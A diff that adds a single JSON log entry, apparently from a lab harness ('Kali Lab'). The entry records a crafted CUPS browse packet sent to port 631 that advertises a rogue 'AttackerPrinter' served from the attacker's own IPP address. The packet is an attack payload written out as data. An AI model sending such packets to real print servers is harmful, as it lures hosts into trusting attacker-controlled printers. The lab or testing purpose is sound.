@@ -1,0 +1,12 @@
+[
+  {
+    "timestamp": "2026-11-09T13:48:56.883885",
+    "variation": 2,
+    "description": "Unusual printer-type flags (colour/PS/duplex)",
+    "src_ip": "172.18.0.1",
+    "src_port": 51429,
+    "dst_ip": "172.18.0.2",
+    "dst_port": 631,
+    "payload": "900014 3 ipp://172.18.0.1:8631/printers/NAME \"Kali Lab\" \"AttackerPrinter-ColourPS\""
+  }
+]
